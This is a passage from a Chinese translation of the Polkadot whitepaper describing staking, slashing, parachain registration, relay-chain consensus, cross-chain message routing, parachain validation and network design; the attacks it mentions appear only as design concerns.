它让账户在想成为验证人的时候可以来注册（需满足某些要求）、也可以提名某用户、在想退出验证人角色的时候还可以来退出。它自身还包含了一些用于验证和达成一致性的功能。 6.2.1 权益代币的流动性 通常我们希望能从网络中把尽可能多的权益代币都抵押进来，因为这关系到抵押权益的总市值和网络的安全性。这可以很简单地通过货币增发和收益分发来激励验证人。然而，这么做会出现一个问题：如果代币都被抵押在权益合约里，用于防止作恶，那么如何保证代币在一定程度上的基本流动性，进而支持价格发现呢？ 一种方法是提供一个前向衍生合约来管理由抵押代币衍生出来的二级代币。但这在非信任的情况下很难实现。这些衍生代币无法等值交易，原因就和欧元区的不同政府发行的债券一样：抵押的代币有可能被扣减而价值降低。至于欧洲政府，他们还可能会违约。对于由验证人质押而来的代币，要考虑到验证人的恶意行为可能会遭到惩罚的情况。 基于我们的原则，我们选择了一种更简单的方案：不能把所有的代币都质押进来。这意味着一部分（可能 20%）代币会被强制保持可流通的状态。尽管从安全的角度上讲，这个方案不完美，但也没有从根本上影响网络的安全。相比于 100%的质押，也将只可能没收 80%的权益作为赔款。 我们还将会使用一个反向拍卖机制来公平地决定质押代币和流通代币的比例。有兴趣成为验证人的代币持有者可以给权益合约提交一个请求，说明他们希望支付的最小比例。每次会话（会话可能每个小时算一次）开始的时候，系统会根据每个意向验证人的押金和支出比例来填满验证人的插槽。一个可能的算法是从提交押金的验证人中，选择那些押金满足如下条件的人：押金不高于“总押金目标/插槽数量”且不低于“次低押金”的一半。如果不够填满这些插槽，那么我们会迅速降低这个“次低押金”来满足条件。 6.2.2 提名用户可以把手中的权益代币非信任地交给一个已激活的验证人，让他们来履行验证人的职责。提名通过一个“批准-投票”系统来完成。每个准提名人可以给权益合约提交一个声明，指出他们信任的可以履行职责的一个或多个验证人的身份。 在每个会话期间，提名人的押金会散布给一个或多个代表他们的验证人。这些验证人的押金是等额分配的。提名人的押金用于验证人承担他们的责任，将能够获得利息或承受相应的扣减。 6.2.3 押金没收/烧毁验证人的某些行为会导致惩罚性地没收他们的押金。如果押金降低到允许的最小值，会话就会提前结束，另一个会话开始。一个不完整的将导致惩罚的行为列表： 属于一条平行链的验证人小组，却不为该平行链的区块提供合法性验证； 签名了该平行链一个不合法的区块； 不去处理出口队列中被投票为已生效的消息； 不参与到共识流程中； 在中继链两个竞争性的分叉上同时签名。 有些行为会威胁到网络的完整性（例如签名不合法的平行链区块，或者签名多个分叉），为了驱逐这些验证人，会没收他们的押金。另外还有一些不那么严重的行为（例如不参与到共识流程中）或者那些无法清晰判别的行为（例如处于一个低效的小组），只会导致一小部分的押金被处罚。在后一种情况中，可以采用一个二级小组的搅拌功能来让恶意节点遭受到比正常节点更多的惩罚。 因为实时同步每条平行链的区块是个非常大的工作，所以在某些情况下（多叉签名和不合法签名），验证人无法很方便地检测到自身的不当行为。在这里有必要指出验证人之外的一些参与方也可以举报这些非法行为，并从中获得奖励，但他们和渔夫还不太一样。 因为有些情况非常严重，我们希望可以很简单地从没收的押金里支付奖金。我们通常倾向于使用烧毁代币的方法进行重分配，而不是采用批量转账的方法。烧币可以从整体上增加代币的价值，也就可以补偿整个网络而不仅是涉及到的特定几方。这主要是作为安全防范机制，只有非常恶劣的行为才会到会非常大金额的惩罚。 很重要的一点是奖金必须足够高才能让网络觉得验证工作是值得做的，当然也不能比成本高太多，否则会招致那些足够有钱的、精心策划的国际级别的犯罪黑客攻击那些不幸的验证人，迫使他们做出非法行为。 规定的奖金也不能比恶意验证人的押金高太多，否则会不正当地激励非法行为：验证人为了奖金自己举报自己。解决方法是要么直接限制成为一个验证人的最小押金量，要么间接教育提名人：如果验证人押金太少，他们可能没有足够的动机来遵守规则。 6.3 平行链的注册这个模块用于记录系统中的每条平行链。它是个相对简单的类似数据库的结构，管理着每条链的静态信息和动态信息。 静态信息包括链的索引（一个整数）和验证协议的标识。协议标识用于区分不同的平行链，只有这样，验证人才能运行正确的验证算法 ，然后提交合法的候选块。一个最初的概念验证版本会关注于如何把一个新的验证算法放在客户端中，这样每增加一个新种类的区块链，就需要一次硬分叉。然而在保证严格和高效的情况下，还是有可能不用通过硬分叉就能让验证人知晓新验证算法。一个可能的实现方法就是用一种确定的、本地编译的、平台无关的语言来描述平行链的验证算法，例如 WebAssembly 等。为了验证这种方法的可行性，我们还要做更多的调查，毕竟如果能够避免硬分叉还是会有很大优势的。 动态信息涉及交易路由系统，比如必须对平行链的的入口队列进行全局共识（在下一节讨论）。 必须通过全民公投才能注册新的平行链。这本来可以直接内部管理，但通过一个外部的全民公投合约会更好，因为这个合约还可以用于更多其他场景的治理。关于平行链投票注册系统的具体参数（例如法定人数、多数派的比例）会用形式化证明做成一个不常更新的“主宪法”系统，当然初始阶段也可能只是用传统的方法。具体的公式不在本文的讨论范围内，例如占 2/3 的多数派通过，并且全系统 1/3 的代币都参与了投票才算通过。还有一些暂停和删除平行链的操作。我们希望永远不要暂停一条平行链，但这个设计是为了能应对平行链的一些紧急情况。最明显的情况是由于验证人运行了平行链的多种客户端实现，导致可能无法对某区块达成共识。我们也鼓励验证人使用多种客户端实现，以便能尽早检测到这类事情，防止押金被扣减。 因为暂停操作是个紧急措施，所以会采用验证人动态投票的方式，而不是通过全民公投。对于重启操作，可能直接通过验证人投票，也可能通过全民公投来完成。 删除操作平行链只能通过全民公投来进行，而且要提供一个宽松的平滑退出过渡期，能让它们成为一个独立的区块链或变成其他共识系统的一部分。这个期限可能是几个月，而且最好由平行链根据自身的需求来制定。 6.4 打包中继链区块区块打包的过程本质上是共识的过程，也是把基本的数据变得有意义的过程。在一个 PoW 链里，打包有一个同义词叫挖矿。在本方案里，它涉及收集验证人对于区块有效性、可用性、一致性的签名，这些区块包括中继链区块和它所包含的全部平行链的区块。 底层的 BFT 共识算法也不是当前的工作范围。我们不描述它，而是使用一种原语描述一种由共识推动的状态机。最终我们希望能受到一些现有共识算法的启发：Tangaora（Raft 的 BFT 变体）、Tendermint 和 HoneyBadgerBFT。共识算法需要并发地对多条平行链达成共识。假设一旦共识达成，我们就可以不可辩驳地记录哪些人参与了其中。我们也可以在协议内把不正当行为的人缩小到一个小组中，里面仅包含哪些恶意参与者，这样就可以在惩罚时可以降低附带伤害。 以签名声明形式存在的这些证明、中继链的状态树根和交易树根一起存储在中继链的块头里。 对于中继链区块和平行链区块的打包过程是在同一个共识生成机制中，两类块共同组成了中继链的内容：平行链并不是由他们的小组隔离地进行“提交”之后再被收集的。这虽然导致中继链的流程更加复杂，但也让我们可以在一个阶段里就完成整个系统的共识，能够将延迟最小化，并且能支持更加复杂的数据可用性，这在路由流程中将会很有用。 可以用一个简单的表格（二维的）来建模每个参与共识机器的状态。每个参与方（验证者）都有一系列以签名形式存在的来源于其他参与方的信息，描述着每条平行链的候选块和中继链的候选块。这些信息有两部分数据： 可用性（Availability）：对于出口队列里这个块的已提交交易，验证人是否有足够的信息以便在下一个块正确地验证平行链的候选块？他们可以投 1（知道）或 0（不确定）。当他们投了 1，他们就承诺在后续的投票中也要这么投票。后面的投票和这个不对应会导致惩罚。有效性（Validity）：平行链的区块是否有效，是否包含了引用的所有的外部数据（比如交易）？这和验证人对平行链的投票相关。他们可以投 1（有效）、-1（无效）或 0（不确定）。只要他们投了非 0，他们就承诺在后续的投票中也要这么投票。后面的投票和这个不对应会导致惩罚。 所有验证人都必须投票；在上面的规则限制下，还可以重新提交投票。共识流程可以像很多标准 BFT 共识算法那样来建模，每条平行链是并行的。除了有很小的概率把少数恶意参与者都被分配到了同一条平行链小组之外，共识算法在整体上还是能支撑网络，最坏的情况也不过只是出现一个或多个无效平行链区块而死锁的情况（何对责任人进行的惩罚）。判断一个独立区块是否有效的基本规则（允许全部的验证人作为一个整体达成共识，然后这些平行链区块就成为中继链上具有一致性的数据引用）： 需要有至少三分之二的验证人投票“是”，并且没人投“否”。 需要超过三分之一的验证人对出口队列消息的可用性与否投票“是”。 对于有效性而言，如果至少有一个“是”且至少有一个“否”投票，一个特殊的条件就开启了，整个验证人就必须投票决定是否有恶意参与者，或者是否产生了意外的分叉。除了有效和无效之外，还支持投第三种票，等效于同时投了“是”和“否”，表示这个节点有相互冲突的意见。这可能是因为节点所有者运行的多种客户端实现而产生了分歧，也预示着平行链协议可能存在不清楚的地方。 当所有验证人的票都被记录过后，发现赢的那个意见少于一定数量的票（详细参数最多可能是一半，也许更少），那就可以假设平行链发生了意外的硬分叉，这条平行链的共识就会被自动暂停。否则，我们假设就是有恶意行为发生，并惩罚那些给输的那个意见投了“是”票的验证人。结论是只有足够的签名票数才能达成一致性，然后中继链的区块就打包完成了，开始打包下一个区块。 6.5 中继链区块打包的改进打包区块的方法确保着系统的正常运行，因为每条平行链的关键信息都要由超过三分之一的验证人来保证可用性，所以它并不能很好地伸缩。这意味着随着更多平行链的增加，每个验证人的工作也会增加。 在开放的共识网络中，如何保证数据的可用性还是个有待解决的问题，然而还是有一些方法可以缓解验证人节点的性能瓶颈。一个简单的方案是：验证人只负责验证数据的可用性，那他们就没必要自己真正地存储、通信和复制数据。第二个方案是数据隔离，这个方案很可能和收集人如何组织数据相关，网络可以对收集人有一定的利息或收入激励，让他们保证提供给验证人的数据是可用的。 然而，这个方案也许可以带来一点伸缩性，但仍没有解决根本问题。因为添加更多平行链通常需要增加验证人，网络资源的消耗（主要是带宽）以链总数的平方的速度增长，长期来看这是不可持续的。 最终，我们可能会思考对于保证共识网络安全的根本限制，网络对带宽的需求增长速度是验证人数乘以消息总进入数。我们不能信任那些将数据分开在不同节点存储的共识网络，因为这会将数据和运算分离。 6.5.1 延迟性介绍简化这个规则的方法是先了解即时性的概念。33% + 1 的验证人最终（eventually）需要对数据的有效性进行投票，而不是立刻（immediately）投票，我们可以更好地利用数据指数级传播的特性，来帮助应对数据通信的峰值。一个合理的等式（尽管未证明）： （1） $$延迟 = 验证人数 * 区块链数$$ 在目前的模型下，系统的规模只有随着链的个数而伸缩，才能保证数据的分布式运算；因为每个链至少需要一个验证人，对于可用性投票的复杂度，我们把它降到了只和验证人个数呈线性关系。现在验证人数可以和链个数类似的增长，不再是： （2） $$延迟 = 数量^2$$ 这意味着随着系统增长，网络内带宽和延迟性的增长是可知的，但达到最终确定性所需的区块数目仍然是以平方增长。这个问题将会继续困扰我们，也可能迫使我们打造一个“非平层”（non-flat）的架构，也就是会有很多按层级结构排列的Polkadot 链，通过一个树形的结构来路由消息。 6.5.2 公众参与微意见（micro-complaints）系统是一种可以促进公众参与的方式。可以有一些类似于渔夫的外部参与方来监管验证人。他们的任务是找到提供了非可用数据的验证人。他们可以给其他的验证人提交一个微意见。这个方案需要用 PoW 或押金机制来防止女巫攻击，否则它会让整个系统失效。 6.5.3 可用性保证人最终的一个方案是从验证人里提名出第二个小组作为可用性保证人（Availability Guarantors）。他们也需要和普通验证人那样交押金，而且有可能来源于同一个组（会在一个长周期里选择他们，至少也是一个会话周期）。和普通验证人不同的是，他们不需要在各条平行链间切换，而只需要形成一个单一的小组，监管所有重要跨链数据的可用性。 这个方案还有个优势是能缓解验证人数和链个数之间的等式关系。链个数可以最终增长（与原始链的验证人小组一起），然而各参与方仍可以保持次线性增长或常量增长，尤其是那些参与数据可用性验证的人。 6.5.4 收集人设置系统需要保证的一个重要方面是：合理地选择那些制造平行链区块的收集人。如果一条平行链由某个收集人控制了，那么外部数据是否可用就会变得不那么明显，这个人就可以比较简单地发动攻击。 为了尽可能地广泛分配收集人，我们可以用伪随机的方法来人工衡量平行链区块的权重。在第一个示例中，我们希望验证人倾向于选择权重更大的候选块，这是共识机制的一个重要部分。我们也必须激励验证人找到最大权重的候选块，验证人可以把他们的奖励按比例分配给这些候选块。 在共识系统里，为了确保收集人的区块被选中的机会是平等的，我们用一个连接所有收集人的随机数生成器来决定每个候选块的权重。例如用收集人的地址和一些密码学安全的伪随机数做异或（XOR）运算来决定最优的块（获胜票）。这给了每个收集人（更准确地说是每个收集人地址）随机公平地打败别人的机会。 验证人通过女巫攻击来生成一个最接近于获胜票的地址，为了阻止这种情况，我们会给收集人的地址加上一些惰性。一个很简单的方法是需要他们的地址有基本的余额，另一个更优雅的方式是综合考虑地址的余额来计算获胜的概率。这里还没有完成建模，我们很可能会让很少余额的人也可以成为收集人。 6.5.5 区块超重如果一个验证人集合被攻击了，他们可能会生成一个虽然有效但要花费大量时间来执行的区块。这个问题来源于一些特定的难解数据题，比如大质数因式分解难题等，验证人小组可能需要非常长的时间才能解出答案，如果有人知道一些捷径，他们的候选块就有巨大的获胜优势。如果一个收集人知道那个信息，而其他人都在忙着计算老的块，那么他就有很大的优势让他的候选块获胜。我们称这种叫超重（overweight）块。 为了防止验证人提交这些大幅超出普通区块的超重块，我们需要添加一些警告：因为执行一个区块要花费的时间是相对的（根据它超重的程度），所以最终可能的投票结果会有三种：第一种是这个区块绝对没有超重，超过 2/3 的验证人声明他们可以在一定时间内算完（例如出块时间的 50%）；另一种是这个区块绝对超重了，超过 2/3 的验证人声明他们无法在限定的时间内执行完这个区块；再一种就是意见分歧基本持平，这种情况下我们会做一些惩罚。 为了保证验证人能预测他们提交的区块是否超重，他们可能需要公布自己在每个块上的执行表现。经过一段时间后，他们就可以通过和其他节点的比较来评估自己处理器的性能。 6.5.6 收集人保险还有一个问题留给了验证人：为了检查收集人区块的有效性，他们不能像 PoW 网络那样，而是必须自己计算里面的交易。恶意收集人可以填充非法或超重的区块给验证人，通过让他们受害（浪费他们的资源）来获取大量的潜在机会成本。 为了预防这个，我们为验证人提供了一个简单的策略。第一：发给验证人的平行链候选块必须要用有钱的中继链账户签名，如果不这么做，验证人会立即丢弃这个块。第二：会用组合算法（或乘法）对这些候选块进行排序，因素包括高于一定限额的账户余额、收集人过去成功提交的区块数（除去那些有惩罚的）、和获胜票的接近程度。这里的限额应该等于提交非法块的惩罚金。 为了警示收集人不要发送非法或超重的交易给验证人，任何验证人都可以在下一个区块中打包一个交易，指出那个非法的区块，并将那个收集人部分或全部的余额都转给那个受害的验证人。这种交易的优先级高于其他交易，使得收集人不能在惩罚之前转走他的余额。惩罚金额可能是动态决定的，也很可能是验证人区块奖励的一部分。为了阻止验证人任意没收收集人的钱，收集人可以对验证人的决定进行上诉，成立一个由验证人随机组成的陪审团，并交一些押金。如果陪审团发现验证人是合理的，那这笔押金就给陪审团了。如果是不合理的，押金退回给该收集人，而验证人要受到惩罚（因为验证人是核心角色，惩罚会比较重）。 6.6 跨链交易路由跨链交易路由是中继链和其验证人的核心功能。这里管理着主要的逻辑：一个提交的交易（简言之为“提交”）是如何从一个来源（source）平行链的出口被强制地路由到另一个目标（destination）平行链里，而且无需任何信任人。 我们很小心地选择了上面的词语；在来源平行链里，我们无需一个明确约束这个提交的交易。我们模型里的唯一约束是：平行链必须尽力按照全部的出口能力打包，这些提交就是他们区块执行的结果。 我们用一个先进先出（FIFO）的队列组织这些提交。作为路由基准（routing base）的队列个数可能在 16 个左右。这个数字代表着我们可以直接支持的平行链性能，而不用采用多相（multi-phase）路由。Polkadot 一开始会支持这种直接路由，然而我们也可能会采用一种多相路由操作（超路由 hyper-routing）作为将来系统伸缩的方式。我们假设所有参与方都知道下两个区块 n，n+1 的验证人分组情况。概括而言，路由系统有如下阶段： 收集人s：合约成员中的验证人 V[n][S]。 收集人s：FOR EACH 小组s：确保合约里有至少一个验证人 V[n][S]。 收集人s：FOR EACH 小组s：假设出口[n-1][s][S]是可用的（上个区块里所有对 S 提交的数据） 收集人s：为 S 构造候选块 b：（b.header, b.ext, b.proof, b.receipt, b.egress）。 收集人s：发送证明信息 proof[S] = (b.header, b.ext, b.proof, b.receipt, b.egress)。 收集人s：确保外部交易数据 b.ext 已经对于其他收集人和验证人可用了。 收集人s：FOR EACH 小组 s：发送出口信息 egress[n][S][s] = (b.header, b.ext, b.receipt, b.egress)给下个区块的接收方小组的验证人 V[n+1][s]。 验证人v：预连接下一个区块的同一个组的成员：让 N = Chain[n+1][V]；连接所有的验证人使 Chain[n+1][v] = N。 验证人v：收集这个块所有的入口数据：FOR EACH 小组 s：检索出口egress[n-1][s][Chain[n][V]]，从其他验证人 v 获得使 Chain[n][v] = Chain[n][V]。可能是通过随机性地选择其他验证人的证明数据。 验证人v：为下个块接收候选块的出口数据：FOR EACH 小组 s，接收 egress[n][s][N]。对区块出口的有效性投票；在意向验证人间重新发布使Chain[n+1][v] = Chain[n+1][V]。 验证人v：等待共识。 egress[n][from][to]代表：在区块 n 里，从来源 from 平行链到目标 to 平行链的当前出口队列信息。收集人 s 是属于平行链 S 的。验证人 V[n][s]是平行链 s 在区块 n 时的验证人小组。相反地，Chain[n][s]是验证人 v 在区块 n 所属的平行链。block.egress[to]是从平行链区块 block 发送给目标平行链 to 的出口队列。 收集人因为希望能够采纳他们出的块，所以收集（交易）手续费作为激励，并保证下一个区块的目标小组成员都能知晓当前块的出口队列。验证人的激励是达成中继链区块的共识，所以他们并不关心最终采纳哪个收集人的区块。一个验证人原则上可以勾结一个收集人，合谋减少采纳其他收集人的概率，然而因为平行链的验证人是随机分配的，所以这也很难得逞，而且还可能会遭到手续费减免，最终影响共识流程。 6.6.1 外部数据可用性如果要在一个去中心化的系统里完成分布式的全部流程，一个长年的遗留问题是：如何确保一条平行链的外部数据都是可用的。这个问题的核心原因是：不可能生成一个关于可用性与否的非交互式证明。在一个拜占庭容错的系统内，我们需要依赖外部数据才能验证任意交易的有效性。假设我们能容忍的最多的拜占庭节点数为 n，我们一共至少需要 n+1 个节点才能证明数据的可用性。 Polkadot 是个希望可以伸缩的系统，这带来了一个问题：如果必须由一个固定比例的验证人来证明数据的有效性，并且假设他们真会存储这些数据来用于判断，那么我们如何避免随着系统的增长而带来的对带宽/存储空间等需求的增长。一个可能的答案是成立一个验证人小组（就是保证人），他们的数目随着 Polkadot 整体的增长而线性增长。这在6.5.3 里提到了。 我们还有第二个技巧。收集人有内在的激励去确保所有数据的可用性，否则他们就不能再生产后续区块了，也就不能再获得手续费了。收集人也可以形成一个小组，成员复杂多样（因为平行链验证人成员的随机性），很难进入。允许最近的收集人（可能是最近几千个块）对某条平行链区块的外部数据发起挑战，来获取一点验证人的奖励。 验证人必须联系这些有明显进攻行为的小组，这些小组会举证、获取并返回数据给收集人，或者直接通过证明数据的非可用性来升级事态（作为原告方直接拒绝提供数据记录，不当行为的验证人会直接断开连接），并联系更多的验证人一起去测试。在后一种情况中，收集人的押金会被退回。一旦超过法定个数的验证人都证明交易的非可用性，验证人小组就可以解散了，非法行为的收集人小组会被惩罚，区块被回退。 6.6.2 路由“提交”每条平行链的头部都包含一个出口树根（egress-trie-root）。这个树根包含了一个路由信息的格子列表，每个格子里都有一个串行（concatenated）结构的出口提交。可以在平行链的验证人之间提供梅克尔树证明，这样就能证明某条平行链的区块对应着另一条平行链的出口队列。 在开始处理平行链区块之前，每条平行链指定区块的出口队列会被并入我们区块的入口队列。假设密码学安全的伪随机数（CSPR）能用来保证公平地对平行链区块进行配对。收集人计算新队列，并根据平行链的逻辑抽干出口队列。 入口队列的内容会被明确地写入平行链区块。这么做有两个目的：第一，平行链可以独立地进行非信任同步，而不用依赖其他链。第二，如果整个入口队列无法在一个块内处理完，那么这种方法可以简化数据逻辑；验证人和收集人可以继续处理下面的区块而不用再做数据引用了。 如果平行链的入口队列超过了区块处理的阈值，那么在中继链上就会被标记为已满，在队列清空之前不会再接收新的消息。使用梅克尔树来证明收集人在平行链区块里的操作是可信的。 6.6.3 弊端这个架构的小瑕疵是可能发生后置炸弹攻击（post-bomb attach）。所有的平行链给另一个平行链发送最大数量的提交，这会瞬间塞满目标链的入口队列，不造成任何伤害地进行了 Dos 攻击。正常情况下，假设有对于 N 条平行链和一系列正常同步的非恶意的收集人和验证人，那么总共需要 N x M 个验证人，每条平行链 L 个收集人，每个块可能的数据路径（data path）有： 验证人：M-1+L+L：M-1 代表平行链集合里的其他验证人，第一个 L 代表每个收集人提供了一个平行链候选块，第二个 L 代表下一个块的全部收集人需要放入出口队列的前块数据。（后一种情况可能会更糟，因为收集人之间会分享这些数据）。收集人：M+kN：M 代表和每个平行链区块相关的验证人的连接数，kN 代表着下一个区块播种（seeding）到每个平行链验证人小组的出口队列的负载（很可能是一些很受喜爱的收集人）。 因此，每个节点数据路径的可能性随系统的复杂度的增长而线性增长。这也是合理的，当系统伸缩到上百上千个平行链的时候，通信的延迟也会变大，进而降低复杂度的增长速度。在这种情况下，会用一个多级的路由算法来减少峰值期的数据路径，但需引入缓存和交易延迟。 6.6.4 超方路由（Hyper-cube Routing）超方路由（Hyper-cube Routing）是一种可以建立在上面描述的基础路由方法上的一种新机制。对节点来说，他们的连接数从需跟平行链和节点小组数一起增长，变成了只跟平行链个数的对数增长。这样就可能需要经过多个平行链的队列才能最终传送“提交”。 路由本身是简单和确定性的。我们从限制入口/出口队列的格子数开始；平行链的总数目是 routing-base（b），这个数字会随着平行链的改变而修正，增长为 routingexponent（e）。在这个模型下，我们的消息总量以 O(be)增长，而数据路径保持为常量，延迟（或传递需要的块数）以 O(e)增长。 我们的路由模型是一个 e 维的超方体，每个立方体的面有 b 种可能位置。对于每个块，我们围绕一个轴来路由消息。为了保证最坏情况下的 e 个块的传递延时，我们用 round-robin fashion 来轮换每个轴。 作为平行链处理的一部分，只要给定当前的块高度（路由维度），入口队列里外部范围的消息就会立即路由给合适的出口队列的格子。这个过程需要在传送路由上发送更多数据，然而这会是个问题，也许可以通过一些替代性的数据负载发送方式解决，比如只包含一个引用，而不是在提交树（post-trie）里包含全负载。 一个拥有 4 条平行链的超方路由系统示例，b = 2、e = 2：阶段 0，对于每个消息 M： $sub_0$：如果 $M_{dest} ∈ {2,3}$ ，那么 sendTo(2) ，否则保留 $sub_1$：如果 $M_{dest} ∈ {2,3}$ ，那么 sendTo(3) ，否则保留 $sub_2$：如果 $M_{dest} ∈ {0,1}$ ，那么 sendTo(0) ，否则保留 $sub_3$：如果 $M_{dest} ∈ {0,1}$ ，那么 sendTo(1) ，否则保留 阶段 1，对于每个消息 M： $sub_0$：如果 $M_{dest} ∈ {1,3}$ ，那么 sendTo(1) ，否则保留 $sub_1$：如果 $M_{dest} ∈ {0,2}$ ，那么 sendTo(0) ，否则保留 $sub_2$：如果 $M_{dest} ∈ {1,3}$ ，那么 sendTo(3) ，否则保留 $sub_3$：如果 $M_{dest} ∈ {0,2}$ ，那么 sendTo(2) ，否则保留 这里的两个维度很容易看做是目标索引的前两位（bits）。第二个块处理低序的位。一旦全部发生（任意顺序），提交就会被路由。 6.6.5 最大化随机性（Serendipity）一个对基本提议的修改是把验证人数固定为 $c^2-c$ 个，每个小组 $c-1$ 个验证人。摒弃原来每个区块时都在平行链间松散地分配验证人的方案，而改成对于每个平行链小组，在下一个区块时，会分配每个验证人到唯一的不同平行链小组。这导致了两个区块之间的不可变性，对于任意配对的平行链，都会有两个验证人调换他们的职责。然而我们不能用这个来确保绝对的可用性（单个验证人可能时常掉线，即使是非恶意的），但可以优化这个方案。 这个方案也会有后遗症。平行链需要重组验证人集合。进而验证人的数量会被绑定在平行链数量的平方级别，从很少开始最终快速增长，在 50 条平行链时就会变得无法承受。这些都不是什么本质问题，对于第一个问题，本来也需要频繁重组验证人集合，无论验证人集合的数量多少。当集合数很少的时候，多个验证人可能被分配到同一条平行链，那么对于全部平行链影响的因素是常量的。对于在很多平行链时的需要很多验证人的问题，可以用在 6.6.3 里讨论的这个多阶段的超方路由机制来缓解。 6.7 平行链的验证验证人抵押了大量的保证金，他们的主要目标就是校验平行链区块是否有效，包括但不限于：状态转换、囊括外部交易、执行等待在入口队列的提交、执行出口队列的最终状态。这个过程本身是比较简单的。验证人一旦完成了前一个区块的打包，他们就可以自由地为后面的几轮共识准备平行链的候选块。 验证人一开始通过平行链收集人（下面介绍）或他的某个副验证人找到一个平行链区块。平行链候选块的数据包含区块头、前块头、外部数据输入（对于以太坊和比特币，这些数据被称为交易，然而他们也可能是任意结构、任意目的）、出口队列数据、状态转换有效性的内部证明数据（对于以太坊，这可能是用来执行每个交易的很多状态/存储树节点）。实验性的证据显示对于目前的以太坊区块，这个数据集最多有几百 K 字节（KiB）。 如果校验没有完成，验证人会尝试从前一个块的转换中获取相关信息，从前一个块的验证人开始，之后到所有签名了这个数据的验证人。 一旦一个验证人接收到了这么一个候选块，他们就在本地验证它。验证过程包含在平行链这个大类的验证人模块里，这个需要共识的软件模块必须写在所有的 Polkadot 实现里（原则上可以在多个实现里共享一个 C ABI 的库，但这会降低安全性，因为他们只是单一实现的引用）。 这个过程会提取前块头，然后用刚达成共识的中继链区块中记录的哈希值来检验。一旦父块头的有效性得到了验证，就会调用平行链类中特定的验证函数。这是个会接收很多数据项（大概就是目前给出的几种）的函数，返回值是对于区块是否有效的简单判断。大多数这种验证函数都将首先检查头部的数据项，这些数据都可以直接从父块衍生出来（例如父块哈希、高度）。之后为了处理交易或提交，他们会尽力填充内部数据结构。对于以太坊这样的区块链，需要执行全部的交易才能往梅克尔树填充这么大量的数据。其他类型的区块链可能有其他的处理措施。 一旦完成验证，入口提交和外部交易（或代表的其他）都会根据链的规则而被固定。（一个可能的默认方式是需要所有入口提交都在服务外部交易之前处理，然而这应该由平行链的逻辑决定）。通过这个规定，一系列的出口提交都会被创建，而且确实符合收集人的候选块要求。最终会一起检查合理填充的块头和候选块头。验证人完成了对候选块的校验后，就对块头哈希进行投票，并发送必要的验证信息给小组里的其他副验证人。 6.7.1 平行链收集人平行链收集人不需要交押金，他们完成的是类似目前区块链网络里矿工的任务。他们属于特定的平行链。为了开展工作，他们必须要有完全同步的中继链和平行链。完全同步的精确含义取决于平行链的种类，尽管它们都包含平行链入口队列的当前状态。在以太坊这个例子中，它还至少要有最近一些块的梅克尔树数据库，但也可能包含非常多的其他数据结构，例如证明账户存在的 Bloom 过滤器、遗传（familial）信息、日志输出、和对应高度区块的分叉回退表单。 为了保持两条区块链的同步，他们必须维护一个交易池来“钓取”（fish）交易，并接收公网上正确验证的交易。有了链和交易池，收集人就可以为每个块的被选验证人（由于同步了中继链所以知道他们身份）打包新的候选块，再附属一些必要信息（例如从节点网络来的有效性证明等），然后提交给验证人。 他们收集所有交易的手续费作为回报。这里有很多经济激励手段。在一个激烈竞争的市场中，如果收集人有富余的话，还可以跟平行链验证人分享手续费，以激励他们打包特定收集人的区块。同样地，一些收集人可能提高所需支付的手续费，使区块对于验证人更有吸引力。在这种情况下，正常的市场机制会使那些更高手续费的交易跳过队列，并能更快地打包到链里。 6.8 网络设计以太坊和比特币等传统区块链中的网络设计需求一般比较简单。所有的交易和区块都未受引导地用 gossip 广播。同步模块中牵涉到的东西会更多一点，以太坊就可以根据不通类别做出不同的响应，但现实中这更多是节点的策略，而不是协议本身的内容。 以太坊基于 devp2p 协议改进了目前的网络协议，支持在单一节点连接中进行多个子协议的多路复用，因此同时支持多个 p2p 协议，但以太坊的协议仍然相对比较初级，而且它还没有完成例如支持 QoS 等重要功能。当初创造一个无所不在的“web3”协议的愿望基本上失败了，只剩下从以太坊众筹出来的几个项目。 Polkadot 的需求更加根本。相比于一个完整的统一网络，Polkadot 有很多种参与方，每方都有不同的需求，参与方需要有很多不同的网络信道来交换数据。从本质上讲，这意味着需要一个能支持更加层级化的网络结构的协议。另外为了促进更多新类型的区块链来扩展网络，也需要有一个新的层级结构。 对于网络协议更深层面的探讨不在本论文范围内，我们需要更多的需求分析。我们可以把网络参与者分为两类（中继链、平行链），每个都有三小类。每条平行链的参与方之间相互通信，而不和其他链通信： 中继链参与方 验证人：P，为每条平行链分割成多个子集 P[s] 可用性保证人：A（在基础协议里由验证人代替） 中继链客户端：M（每条平行链的成员） 平行链参与方： 平行链收集人：C[0]，C[1]，… 平行链渔夫：F[0]，F[1]，… 平行链客户端：S[0]，S[1]，… 平行链轻客户端：L[0]，L[1]，… 通常我们认为网络成员和他们的设置间会发生如下几种通信： P | A &lt;-&gt; P | A：为了达成共识，验证人/保证人必须连接。 P[s] &lt;-&gt; C[s] | P[s]：每个作为平行链成员的验证人会和其他成员连接来发现区块并分享区块，例如收集人。 A &lt;-&gt; P[s] | C | A：每个可用性保证人将需要从验证人那里收集签过名的共识相关的跨链数据；收集人可以广播给保证人来优化对他们区块的共识。一旦完成，数据会广播给其他保证人来促进共识。 P[s] &lt;-&gt; A | P[s’]：平行链验证人将需要从前一个验证人或可用性保证人集合收集额外的输入数据。 P[s] &lt;-&gt; A：当需举报时，渔夫公告给任何参与方。 M &lt;-&gt; M | P | A：中继链客户端输出数据给验证人和保证人。 S[s] &lt;-&gt; S[s] | P[s] | A：平行链客户端输出数据给验证人和保证人。 L[s] &lt;-&gt; L[s] | S[s]：平行链轻客户端从全客户端获取数据。 如果为了保证高效的传输，那种每个节点无差异的平层网络（类似以太坊 devp2p）就不再适应了。协议里很可能扩展引入一个合理的节点选择和发现机制，还可能计划一些前瞻性的算法，保证节点的顺序在适当时候是“偶然”连接的。 各类不同参与方节点的具体策略会不一样：对于一个能伸缩的多链系统，收集人要么需要持续地重新连接被选的验证人，要么连接一个验证人小组来保证他们永不断线，即使大多数时间他们对于自己是无用的。收集人也会保持和可用性保证人集合的一个或多个稳定连接，来确保需要共识数据的快速传播。 可用性保证人将保持相互连接，还要保持与验证人（为了共识和需共识的平行链数据）、一些收集人（为了平行链数据）、一些渔夫和一些全节点（为了缺失的信息）的稳定连接。验证人倾向于寻找其他验证人，特别是那些在同一个小组里的，还有那些可以提供平行链区块的收集人。 渔夫和一般中继链或平行链客户端会倾向于和验证人或保证人保持一个连接，但和他们相似的很多节点却不这么做。平行链轻客户端除了连接其他轻客户端外，也会连接一个平行链全客户端。 6.8.1 